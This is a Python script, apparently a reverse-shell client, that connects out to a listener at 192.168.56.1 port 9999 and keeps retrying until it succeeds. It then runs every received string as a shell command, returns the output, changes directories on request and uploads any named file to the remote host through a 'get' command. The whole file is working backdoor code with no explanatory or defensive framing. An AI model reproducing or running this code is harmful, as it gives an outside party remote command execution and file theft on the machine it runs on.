import socket
import subprocess
import os

#############################################################
############################################################
def send_file(client_socket, filename):
    """Sends a file over the socket."""
    try:
        filesize = os.path.getsize(filename)
        client_socket.send(str(filesize).encode())

        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(4096)
                if not bytes_read:
                    break
                client_socket.sendall(bytes_read)
        print(f"File '{filename}' sent successfully.")

    except FileNotFoundError:
        print(f"Error: File '{filename}' not found.")
        client_socket.send("-1".encode())
    except Exception as e:
        print(f"An error occurred during file transfer: {e}")
        client_socket.send("-2".encode())


############################################################
#########################################################

s = socket.socket()
global host 
global port

host = '192.168.56.1'
port = 9999

def connecting():
    try:
        s.connect((host,port))
    except:
        #print("Error in connecting to server")
        connecting()

connecting()

hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

while True:
    data = s.recv(2048)
    print(data)
    if data[:2].decode("utf-8") == "cd":
        if os.path.isdir(data[3:].decode("utf-8")):
            os.chdir(os.getcwd() + "\\" + data[3:].decode("utf-8"))
            s.send(str.encode("("+ str(IPAddr) + ")"+ str(os.getcwd()) +"> "))
        else:
            os.chdir(data[3:].decode("utf-8"))
            s.send(str.encode("("+ str(IPAddr) + ")"+ str(os.getcwd()) +"> "))
    elif data[:3].decode("utf-8") == "get":
        send_file(s,data[4:].decode("utf-8"))  
    elif len(data)>0: 
    
        cmd = subprocess.Popen(data.decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)

        output_byte = cmd.stdout.read() +cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = "("+ IPAddr + ")"+ os.getcwd() +"> "
        s.send(str.encode(output_str+currentWD))
        print(output_str)




